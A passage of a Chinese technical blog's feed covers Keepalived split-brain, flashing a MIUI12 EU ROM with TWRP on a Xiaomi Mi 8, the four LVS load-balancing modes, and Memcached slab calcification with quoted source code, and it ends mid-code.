title="4.1、背景"></a>4.1、背景</h3><p>在<code>双机热备</code>高可用（HA）系统中，当两个节点断开联系时，本来为一个整体、动作协调的HA系统就会分裂成为两个独立的节点。由于节点之间失去通信，它们都以为是对方出了故障，因此两个节点上的HA就会像脑裂了一样，本能地争取”应用服务”，可能导致如下两种情况：</p><ul><li>共享资源被不断的争夺，导致服务不可用；</li><li>共享资源备同时获取，导致最终的数据出错；</li></ul><p>由于Keepalived中的主备两台机器所处的状态与对方的状态有关，如果两台机器之间的网络出现了问题，就会出现脑裂的情况，这时网络中就会由于资源竞争导致<code>双主</code>或者<code>无主</code>的情况，从而进行服务。</p><h3 id="4-2、解决方案"><a href="#4-2、解决方案" class="headerlink" title="4.2、解决方案"></a>4.2、解决方案</h3><p>针对于脑裂的问题，通常大概有四种可行的思路：</p><ul><li><code>Quorums(法定人数)</code>：通过设置法定人数, 进而确定集群的容忍度, 当集群中存活的节点少于法定人数, 集群将不可用。通常存活的节点数必须过半，以便能够选取出集群的Leader，ZooKeeper默认就是利用该策略进行防止脑裂以及进行Leader选举；</li><li><code>第三方仲裁</code>：当多个节点出现冲突的情况，可以由第三方仲裁来决定谁是Leader，Keepalived可以使用这个方案来解决；</li><li><code>Redundant Communications(冗余通信)</code>：集群中采用多种通信方式，防止一种通信方式失效导致集群中的节点无法通信；</li><li><code>Fencing(共享资源)</code>：能看到共享资源就表示在集群中，能够获得共享资源的锁的就是Leader，这种方式在某些情况下可能导致死锁；</li></ul><p>可在Keepalived的机器上配置相关的检测任务，通过检测本机与网关的通畅性来<code>起停</code>本地的Keepalived服务，进而保证在出现节点网络异常的情况下能够杀掉本机的Keepalived来避免脑裂情况的出现。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Keepalived </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米8刷入MIUI12国外版</title>
      <link href="/2020/06/13/mi8-miui12-eu-rom/"/>
      <url>/2020/06/13/mi8-miui12-eu-rom/</url>
      
        <content type="html"><![CDATA[<h2 id="一、MIUI相关版本"><a href="#一、MIUI相关版本" class="headerlink" title="一、MIUI相关版本"></a>一、MIUI相关版本</h2><ul><li><a href="https://www.miui.com/download.html">国内版本</a>：MIUI的官方国内版本，功能比较齐全，国内的服务套件比较齐全（小爱同学等），但是广告比较多，并且预装应用以及后台常驻的系统组件比较多，缺少Google套件（可以通过其他方式安装，但是会有稳定性以及兼容问题）；</li><li><a href="https://c.mi.com/global/miuidownload/index">国际版</a>：MIUI的官方的国际版本（也被称为俄罗斯版本），自带过多的Google套件，比较臃肿，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li><li><a href="https://miuipolska.pl/download/">波兰版本</a>：MIUI的第三方定制的ROM，自带Google套件，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li><li><a href="https://xiaomi.eu/community/">英国版本</a>：MIUI的第三方定制的ROM，自带Google套件，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li></ul><h2 id="二、刷机教程"><a href="#二、刷机教程" class="headerlink" title="二、刷机教程"></a>二、刷机教程</h2><p>针对于<a href="https://www.miui.com/download.html">国内版本</a>和<a href="https://c.mi.com/global/miuidownload/index">国际版</a>，我们可是使用小米官方提供的刷机方式进行刷机即可，<a href="http://www.miui.com/shuaji-329.html">官方教程</a>。针对于第三方地址的ROM，可以按照如下方式进行刷机。接下来我们将对小米8进行刷机，ROM为英国版本MIUI12。</p><h3 id="2-1、解锁Bootloader"><a href="#2-1、解锁Bootloader" class="headerlink" title="2.1、解锁Bootloader"></a>2.1、解锁Bootloader</h3><p>关于Bootloader的详细介绍可以查看<a href="https://baike.baidu.com/item/Boot%20Loader">百度百科 - Bootloader</a>，简而言之就是手机厂商为了防止用户刷入第三方ROM导致系统出现不可逆的损坏，同时也为了保护手机底层以及用户的一些敏感信息。目前小米全线的手机都对Bootloader进行了加锁，我们可以使用小米官方提供的解锁方式进行解锁：<a href="http://www.miui.com/unlock/index.html">解锁小米手机</a></p><h3 id="2-2、安装TWRP"><a href="#2-2、安装TWRP" class="headerlink" title="2.2、安装TWRP"></a>2.2、安装TWRP</h3><p><a href="https://zh.wikipedia.org/wiki/TWRP">TWRP</a>，全称是<code>Team Win Recovery Project</code>是一款知名的第三方的Recovery工具，关于Recovery的介绍可以参考<a href="https://baike.baidu.com/item/Recovery/9995978">百度百科 - Recovery</a>，在进行第三方ROM的刷机之前我们需要给系统刷入TWRP，我们可以在<a href="https://twrp.me/">TWRP的官网</a>找到对应手机版本的TWRP进行刷入，具体步骤如下：</p><ul><li>在TWRP支持的设备列表选择手机厂商型号：<a href="https://twrp.me/Devices/">https://twrp.me/Devices/</a> ；</li><li>选择对应手机型号的最新版本的TWRP进行下载即可，截止到测试时最新版本为<code>3.3.1-2</code>；</li><li>备份手机中的重要数据，刷机过程中需要清除手机数据；</li><li>手机进入fastboot模式（小米8在关机后长按电源键+音量下键即可进入）连接电脑，使用以下指令验证手机设备使用正常识别并且进行刷入操作：<ul><li><code>adb devices</code>：如果获取到手机设备序列号即代表当前电脑已经识别手机并连接成功；</li><li><code>fastboot flash recovery twrp-x.x.x-x-polaris.img</code>：将下载好的TWRP刷入手机，之后后通过提示信息可判断是否刷入成功；</li><li><code>fastboot oem reboot-recovery</code>：重启手机并进入<code>TWRP Recovery</code>模式；</li></ul></li></ul><h3 id="2-3、下载ROM包并刷机"><a href="#2-3、下载ROM包并刷机" class="headerlink" title="2.3、下载ROM包并刷机"></a>2.3、下载ROM包并刷机</h3><ul><li>由于我们计划刷入的ROM为<code>MIUI12英国版</code>，因此在<a href="https://xiaomi.eu/community/">英国版本</a>网站中下载指定的版本，我们使用的版本为<code>MIUI12的20.6.11</code>；</li><li>将下载好的ROM包存入手机；</li><li>进入手机的<code>TWRP Recovery</code>模式，小米8可通过以下方式进入：同时按电源键+音量上键，在手机震动出现小米Logo后松开电源键，不松开音量上键等待进入；</li><li>在<code>TWRP Recovery</code>模式中选择安装对应的ROM包即可；</li><li>由于使用的是非国内版的ROM包，安装完成后进入系统启动配置时可能需要能够访问外网的网络环境；</li></ul><h3 id="2-4、刷入小米钱包"><a href="#2-4、刷入小米钱包" class="headerlink" title="2.4、刷入小米钱包"></a>2.4、刷入小米钱包</h3><p>小米8本身支持全功能NFC，但是由于国外版本的ROM没有内置小米钱包，刷机之后无法使用小米公交卡等NFC服务，因此需要手动刷入小米钱包。</p><h4 id="2-4-1、下载国内版本对应ROM"><a href="#2-4-1、下载国内版本对应ROM" class="headerlink" title="2.4.1、下载国内版本对应ROM"></a>2.4.1、下载国内版本对应ROM</h4><p>我们需要首先从国内版本的ROM中提取出小米钱包，因此之前需要下载与国外版相同版本ROM的国内ROM，但是由于<code>MIUI12</code>的<code>20.6.11</code>版本刚刚释出，并且<code>MIUI12</code>在国内处于预约测试状态，只能通过之前预约的在手机端进行更新下载，我们暂时没有找到<code>20.6.11</code>版本的国内的ROM的下载方式，不过我们仍旧可以通过较低版本的<code>MIUI12</code>的ROM包进行提取操作，网友给出了<code>MIUI12</code>的较低版本的部分机型的下载地址：<a href="https://news.mydrivers.com/1/686/686222.htm">https://news.mydrivers.com/1/686/686222.htm</a></p><h4 id="2-4-2、提取小米钱包"><a href="#2-4-2、提取小米钱包" class="headerlink" title="2.4.2、提取小米钱包"></a>2.4.2、提取小米钱包</h4><ul><li>下载提取工具<code>mipay-extract</code>：<a href="https://github.com/linusyang92/mipay-extract%EF%BC%9B">https://github.com/linusyang92/mipay-extract；</a></li><li>将下载的国内版的ROM放入<code>mipay-extract</code>文件夹目录中，并运行同目录下的<code>extract.bat</code>（Windows环境下）；</li><li>将提取出来的<code>mipay-*-*.zip</code>拷入手机根目录中；</li></ul><h4 id="2-4-3、刷入小米钱包"><a href="#2-4-3、刷入小米钱包" class="headerlink" title="2.4.3、刷入小米钱包"></a>2.4.3、刷入小米钱包</h4><ul><li>重启进入<code>TWRP Recovery</code>模式，选择<code>挂载</code>，并选中<code>System</code>，然后返回点击<code>安装</code>，选择对应的<code>mipay-*-*.zip</code>进行卡刷即可；</li><li>刷入成功后进入手机系统后，会发现系统中多了一个<code>小米钱包</code>的软件，然后进入<code>设置</code>，将系统中的NFC相关设置的<code>安全模块位置</code>修改为<code>内置安全模块</code>；</li><li>后续即可正常使用NFC用于公交，NFC卡片复制等；</li></ul><h2 id="三、参考网址"><a href="#三、参考网址" class="headerlink" title="三、参考网址"></a>三、参考网址</h2><ul><li><a href="http://www.midousir.com/2019/05/xiaomi8-pro-recovery/">http://www.midousir.com/2019/05/xiaomi8-pro-recovery/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> MIUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LVS的四种工作模式</title>
      <link href="/2020/06/10/lvs-4-models/"/>
      <url>/2020/06/10/lvs-4-models/</url>
      
        <content type="html"><![CDATA[<h2 id="一、DR模式"><a href="#一、DR模式" class="headerlink" title="一、DR模式"></a>一、DR模式</h2><p><img src="https://cdn.bugwz.com/lvs-dr.png" alt="LVS-DR"></p><h3 id="1-1、原理"><a href="#1-1、原理" class="headerlink" title="1.1、原理"></a>1.1、原理</h3><ul><li>客户端将访问VIP报文发送给<code>LVS</code>；</li><li>LVS将客户端请求报文的MAC地址改为后端真实服务器的MAC地址；</li><li>后端真实服务器得到访问报文后进行IP查看，在确认自己有对应的VIP之后进行请求处理；</li><li>后端真实服务器在处理完数据请求后，直接响应客户端；</li></ul><p><strong>数据包流转过程：</strong></p><p><img src="https://cdn.bugwz.com/lvs-dr-process.png" alt="LVS-DR-Process"></p><h3 id="1-2、特点"><a href="#1-2、特点" class="headerlink" title="1.2、特点"></a>1.2、特点</h3><ul><li>工作在数据链路层（OSI网络模型中的第二层），需要由LVS修改客户端请求的二层数据包的目标MAC地址；</li><li>LVS和后端真实的服务器需要处在一个广播域（VLan）中；</li><li>LVS和后端真实的服务器上都需要配置VIP，并且后端真实的服务不应该响应网络中对于该VIP的ARP请求；</li></ul><h3 id="1-3、优缺点"><a href="#1-3、优缺点" class="headerlink" title="1.3、优缺点"></a>1.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li><code>LVS</code>只是修改了<code>MAC地址</code>，所以非常快速，并且<code>LVS</code>不会成为瓶颈；</li><li>不需要使用隧道结构，绝大多数操作系统都可以用于服务；</li></ul></li><li><strong>缺点：</strong><ul><li><code>LVS</code>必须和后端真实服务器处于同一<code>VLan</code>中；</li><li>后端真实服务器直接响应客户端，对于后端真实服务器来说，并不安全；</li></ul></li></ul><h3 id="1-4、软件应用"><a href="#1-4、软件应用" class="headerlink" title="1.4、软件应用"></a>1.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="二、TUNNEL模式"><a href="#二、TUNNEL模式" class="headerlink" title="二、TUNNEL模式"></a>二、TUNNEL模式</h2><p><img src="https://cdn.bugwz.com/lvs-tunnel.png" alt="LVS-TUNNEL"></p><h3 id="2-1、原理"><a href="#2-1、原理" class="headerlink" title="2.1、原理"></a>2.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li>LVS收到豹纹后，发现请求的IP是在规则里面存在的地址，那么它将在客户端请求报文的首部再封装一层 IP 报文,将源地址改为LVS机器的IP，目标地址改为后端真实的服务器IP ,并将此包发送给对应的后端真实的服务器；</li><li>后端真实服务器将请求报文后，会首先拆开第一层封装,然后发现里面还有一层 IP 首部的目标地址是自己 lo 接口上的 <code>VIP</code> ，所以会处理次请求报文；</li><li>后端真实服务器在处理完数据请求后，直接响应客户端；</li></ul><h3 id="2-2、特点"><a href="#2-2、特点" class="headerlink" title="2.2、特点"></a>2.2、特点</h3><ul><li>工作在网络层（OSI网络模型中的第三层），需要由<code>LVS</code>进行二次封装报文；</li><li><code>LVS</code>和后端真实服务器上都要有<code>VIP</code>；</li><li>由于会存在二次报文封装，所以请求的报文不能太大；</li></ul><h3 id="2-3、优缺点"><a href="#2-3、优缺点" class="headerlink" title="2.3、优缺点"></a>2.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>可处理巨大的请求量；</li></ul></li><li><strong>缺点：</strong><ul><li>服务器需要支持<code>IP Tunneling</code>协议；</li></ul></li></ul><h3 id="2-4、软件应用"><a href="#2-4、软件应用" class="headerlink" title="2.4、软件应用"></a>2.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="三、NAT模式"><a href="#三、NAT模式" class="headerlink" title="三、NAT模式"></a>三、NAT模式</h2><p><img src="https://cdn.bugwz.com/lvs-nat.png" alt="LVS-NAT"></p><h3 id="3-1、原理"><a href="#3-1、原理" class="headerlink" title="3.1、原理"></a>3.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li>当用户请求到达 <code>DirectorServer</code> ，此时请求的数据报文会先到内核空间的 <code>PREROUTING链</code>， 此时报文的<code>源IP</code> 为 <code>CIP</code>，<code>目标IP</code>为 <code>VIP</code> ；</li><li><code>PREROUTING</code> 检查发现数据包的<code>目标IP</code> 是本机，将数据包送至<code>INPUT链</code>；</li><li><code>IPVS</code> 比对数据包请求的服务是否为集群服务，若是，修改数据包的<code>目标IP</code> 地址为 <code>后端服务器IP</code>，然后将数据包发至 <code>POSTROUTING 链</code>， 此时报文的 <code>源IP</code> 为 <code>CIP</code>，<code>目标IP</code> 为 <code>RIP</code> ，在这个过程完成了 <code>目标IP</code> 的转换；</li><li><code>POSTROUTING链</code> 通过选路，将数据包发送给 <code>Real Server</code>；</li><li><code>Real Server</code> 比对发现目标为<code>自己的IP</code>，开始构建响应报文发回给 <code>Director Server</code>。 此时报文的<code>源IP</code> 为 <code>RIP</code>，<code>目标IP</code> 为 <code>CIP</code> ；</li><li><code>Director Server</code> 在响应客户端前，此时会将 <code>源IP</code> 地址修改为 <code>自己的VIP地址</code>，然后响应给客户端。 此时报文的 <code>源IP</code> 为 <code>VIP</code>，<code>目标IP</code> 为 <code>CIP</code>；</li></ul><h3 id="3-2、特点"><a href="#3-2、特点" class="headerlink" title="3.2、特点"></a>3.2、特点</h3><ul><li>LVS服务器需要有不同的网段；</li><li>真实服务器的网关必须设置为LVS的ip地址；</li></ul><h3 id="3-3、优缺点"><a href="#3-3、优缺点" class="headerlink" title="3.3、优缺点"></a>3.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>节省IP地址；</li><li>能够对内部的请求链路进行伪装；</li></ul></li><li><strong>缺点：</strong><ul><li>由于返回给请求方的数据需要经过调度器，因此执行效率较低；</li></ul></li></ul><h3 id="3-4、软件应用"><a href="#3-4、软件应用" class="headerlink" title="3.4、软件应用"></a>3.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="四、FULLNAT模式"><a href="#四、FULLNAT模式" class="headerlink" title="四、FULLNAT模式"></a>四、FULLNAT模式</h2><p><img src="https://cdn.bugwz.com/lvs-fullnat.png" alt="LVS-FULLNAT"></p><h3 id="4-1、原理"><a href="#4-1、原理" class="headerlink" title="4.1、原理"></a>4.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li><code>Director</code> 接过请求，发现是请求后端的集群服务；</li><li><code>Director</code> 对请求进行 <code>FULL NAT</code>，把<code>源IP</code>修改为<code>DIP</code>，把<code>目标IP</code>修改为任意<code>后端RS</code>的<code>RIP</code>，然后发送给后端；</li><li><code>RS</code>收到请求后进行处理并响应，响应报文的<code>源IP</code>为<code>RIP</code>，<code>目标IP</code>还是<code>DIP</code>，经过内部路由，将响应报文回复给 <code>Director</code>；</li><li><code>Director</code> 接受到响应报文后，进行 <code>FULL NAT</code>，把<code>源IP</code>修改为<code>VIP</code>，<code>目标IP</code>修改为<code>CIP</code>；</li></ul><h3 id="4-2、特点"><a href="#4-2、特点" class="headerlink" title="4.2、特点"></a>4.2、特点</h3><ul><li><code>RIP</code>，<code>DIP</code>可以使用私有地址；</li><li><code>RIP</code>和<code>DIP</code>可以不再同一个网络中，且<code>RIP</code>的网关未必需要指向<code>DIP</code>；</li><li>支持端口映射；</li><li><code>RS</code> 的操作系统可以使用任意类型；</li><li>请求报文经由 <code>Director</code>，响应报文也经由 <code>Director</code>；</li><li>抗攻击，可跨 <code>VLAN</code>，需要重新编译内核；</li></ul><h3 id="4-3、优缺点"><a href="#4-3、优缺点" class="headerlink" title="4.3、优缺点"></a>4.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>解决了跨<code>VLAN</code>的问题；</li><li><code>LVS</code>和<code>RS</code>的部署在<code>VLAN</code>上将不再有任何限制，大大提高了运维部署的便利性；</li></ul></li><li><strong>缺点：</strong><ul><li>需要做4次地址转换；</li></ul></li></ul><h3 id="4-4、软件应用"><a href="#4-4、软件应用" class="headerlink" title="4.4、软件应用"></a>4.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="五、相关网址"><a href="#五、相关网址" class="headerlink" title="五、相关网址"></a>五、相关网址</h2><ul><li><a href="http://www.linuxvirtualserver.org/">Linux Virtual Server</a></li><li><a href="http://element-ui.cn/news/show-337453.aspx">负载均衡集群——LVS之四种模式</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> LVS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memcached的钙化及相关解决方案</title>
      <link href="/2020/05/24/memcached-slab-calcification/"/>
      <url>/2020/05/24/memcached-slab-calcification/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>由于Memcached存储数据的时候是按照Slabs分类进行存储的，当内存达到Memcached限制的时候，服务进程会执行一系列的内存回收方案，但是，不管是什么内存回收方案，回收的大前提就只有一种：<strong>只回收与即将写入数据写入数据块一致的Slabs</strong>。因此，这就导致了在业务访问模型变更之后，Memcached对于之前访问模型存储的数据就不会做任何变更，也就是说那部分数据永不会被剔除，因此最终服务可用的内存也会远小于进程启动时的设定，这种情况就被称为Memcached的Slab钙化现象（Slab Calcification）。</p><p>在Memcached的 <a href="https://github.com/memcached/memcached/wiki/ReleaseNotes1411">1.4.11</a> 版本之前，官方版本一直存在内存钙化的问题，在这个过程中，Twitter基于Memcached 1.4.4的版本推出了 <a href="https://github.com/twitter/twemcache">Twemcache</a> 尝试解决了Slab钙化的问题。在1.4.11版本中，官方引入了 Slab 的 <code>Automove &amp; Rebalance</code> 的策略也解决了内存钙化的问题。</p><h2 id="二、-Automove-amp-Rebalance-策略"><a href="#二、-Automove-amp-Rebalance-策略" class="headerlink" title="二、 Automove &amp; Rebalance 策略"></a>二、 Automove &amp; Rebalance 策略</h2><h3 id="2-1、概念简介"><a href="#2-1、概念简介" class="headerlink" title="2.1、概念简介"></a>2.1、概念简介</h3><p>通过检测每个<code>Slab Classes</code>的内存使用情况，判断哪些需要使用更多的内存，从而将其他的<code>Slab Classes</code>中的数据清除，将得到的内存空间分配给需要的<code>Slab Classes</code>。</p><h3 id="2-2-算法逻辑"><a href="#2-2-算法逻辑" class="headerlink" title="2.2 算法逻辑"></a>2.2 算法逻辑</h3><p><strong>具体算法实现以最新版本的Memcached进行讲解（版本：1.6.6）</strong>，在这个版本中，automove的实现逻辑在主线程中，并不是使用一个单独的线程（<code>1.4.14</code>到<code>1.4.24</code>版本中的实现逻辑为一个单独的线程，关于这个区间版本中<code>automove</code>的具体实现逻辑，可以参考<a href="https://blog.csdn.net/luotuo44/article/details/43015129">这里</a>）。</p><h4 id="2-2-1、Automove执行逻辑"><a href="#2-2-1、Automove执行逻辑" class="headerlink" title="2.2.1、Automove执行逻辑"></a>2.2.1、Automove执行逻辑</h4><p>每次内存分配前都会判断当前内存是否富余，在内存不够的情况下会执行<code>memory_release</code>函数（该函数依旧受限于<code>settings.slab_reassign</code>参数）进行相关的内存释放。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Must only be used if all pages are item_size_max */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">memory_release</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (mem_base != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!settings.slab_reassign)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 内存不够的情况下,选取一个page进行内存释放 */</span></span><br><span class="line">    <span class="keyword">while</span> (mem_malloced &gt; mem_limit &amp;&amp;</span><br><span class="line">            (p = get_page_from_global_pool()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        mem_malloced -= settings.slab_page_size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选取page的逻辑如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Fast FIFO queue */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">get_page_from_global_pool</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">slabclass_t</span> *p = &amp;slabclass[SLAB_GLOBAL_PAGE_POOL];</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;slabs &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> 这里的含义是？为什么取最后一个？ */</span></span><br><span class="line">    <span class="type">char</span> *ret = p-&gt;slab_list[p-&gt;slabs - <span class="number">1</span>];</span><br><span class="line">    p-&gt;slabs--;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2、Rebalance执行逻辑"><a href="#2-2-2、Rebalance执行逻辑" class="headerlink" title="2.2.2、Rebalance执行逻辑"></a>2.2.2、Rebalance执行逻辑</h4><p>线程启动入口为<code>start_slab_maintenance_thread</code>函数（是否启用受限制于<code>settings.slab_reassign</code>启动参数，该参数在<code>1.5.0</code>之前的版本中默认为<code>false</code>，在<code>1.5.0</code>及之后的版本默认为<code>true</code>）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start_slab_maintenance_thread</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    slab_rebalance_signal = <span class="number">0</span>;</span><br><span class="line">    slab_rebal.slab_start = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret = pthread_create(&amp;rebalance_tid, <span class="literal">NULL</span>,</span><br><span class="line">                              slab_rebalance_thread, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Can&#x27;t create rebal thread: %s\n&quot;</span>, strerror(ret));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在未执行实际的slab class重分配之前的逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Slab mover thread.</span></span><br><span class="line"><span class="comment"> * Sits waiting for a condition to jump off and shovel some memory about</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">slab_rebalance_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> was_busy = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> backoff_timer = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> backoff_max = <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">/* So we first pass into cond_wait with the mutex held */</span></span><br><span class="line">    mutex_lock(&amp;slabs_rebalance_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Must finish moving page before stopping */</span></span><br><span class="line">    <span class="comment">// 初始状态：slab_rebalance_signal = 0, do_run_slab_rebalance_thread = 1</span></span><br><span class="line">    <span class="keyword">while</span> (slab_rebalance_signal || do_run_slab_rebalance_thread) &#123;</span><br><span class="line">        <span class="keyword">if</span> (slab_rebalance_signal == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (slab_rebalance_start() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* Handle errors with more specificity as required. */</span></span><br><span class="line">                slab_rebalance_signal = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            was_busy = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slab_rebalance_signal &amp;&amp; slab_rebal.slab_start != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            was_busy = slab_rebalance_move();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slab_rebal.done) &#123;</span><br><span class="line">            slab_rebalance_finish();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (was_busy) &#123;</span><br><span class="line">            <span class="comment">/* Stuck waiting for some items to unlock, so slow down a bit</span></span><br><span class="line"><span class="comment">             * to give them a chance to free up */</span></span><br><span class="line">            usleep(backoff_timer);</span><br><span class="line">            backoff_timer = backoff_timer * <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (backoff_timer &gt; backoff_max)</span><br><span class="line">                backoff_timer = backoff_max;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slab_rebalance_signal == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* always hold this lock while we&#x27;re running */</span></span><br><span class="line">            pthread_cond_wait(&amp;slab_rebalance_cond, &amp;slabs_rebalance_lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> cancel in-flight slab page move</span></span><br><span class="line">    mutex_unlock(&amp;slabs_rebalance_lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Rebalance的触发来源：</strong></p><ul><li><strong>手动执行指令</strong>：<code>slabs reassign src dest</code>(<code>1.4.11</code>版本后支持)；</li><li><strong>lru相关的线程</strong>；</li></ul><p>在执行实际的Rebalance之前，需要获悉待清理的来源slab class，和需要给哪一个slab class分配内存：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">enum</span> reassign_result_type <span class="title function_">do_slabs_reassign</span><span class="params">(<span class="type">int</span> src, <span class="type">int</span> dst)</span> &#123;</span><br><span class="line">    <span class="type">bool</span> nospare = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (slab_rebalance_signal != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> REASSIGN_RUNNING;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 移动的src和dst不能相同 */</span></span><br><span class="line">    <span class="keyword">if</span> (src == dst)</span><br><span class="line">        <span class="keyword">return</span> REASSIGN_SRC_DST_SAME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 随机选取一个原slab class并将其移动到dst，src不能与dst相同，</span></span><br><span class="line"><span class="comment">     * 注意: 1.4.14及之后的版本开始支持任意来源的形式，即&#x27;slabs reassign -1 15&#x27; </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (src == <span class="number">-1</span>) &#123;</span><br><span class="line">        src = slabs_reassign_pick_any(dst);</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> If we end up back at -1, return a new error type */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src &lt; SLAB_GLOBAL_PAGE_POOL || src &gt; power_largest ||</span><br><span class="line">        dst &lt; SLAB_GLOBAL_PAGE_POOL || dst &gt; power_largest)</span><br><span class="line">        <span class="keyword">return</span> REASSIGN_BADCLASS;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;slabs_lock);</span><br><span class="line">    <span class="comment">/* 原slab class没有或者只有一个slab则不能分配给别的slab class */</span></span><br><span class="line">    <span class="keyword">if</span> (slabclass[src].slabs &lt; <span class="number">2</span>)</span><br><span class="line">        nospare = <span class="literal">true</span>;</span><br><span class="line">    pthread_mutex_unlock(&amp;slabs_lock);</span><br><span class="line">    <span class="keyword">if</span> (nospare)</span><br><span class="line">        <span class="keyword">return</span> REASSIGN_NOSPARE;</span><br><span class="line"></span><br><span class="line">    slab_rebal.s_clsid = src;</span><br><span class="line">    slab_rebal.d_clsid = dst;</span><br><span class="line"></span><br><span class="line">    slab_rebalance_signal = <span class="number">1</span>;</span><br><span class="line">    pthread_cond_signal(&amp;slab_rebalance_cond);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> REASSIGN_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体执行slab class重分配的相关函数为<code>slab_rebalance_thread</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* refcount == 0 is safe since nobody can incr while item_lock is held.</span></span><br><span class="line"><span class="comment"> * refcount != 0 is impossible since flags/etc can be modified in other</span></span><br><span class="line"><span class="comment"> * threads. instead, note we found a busy one and bail. logic in 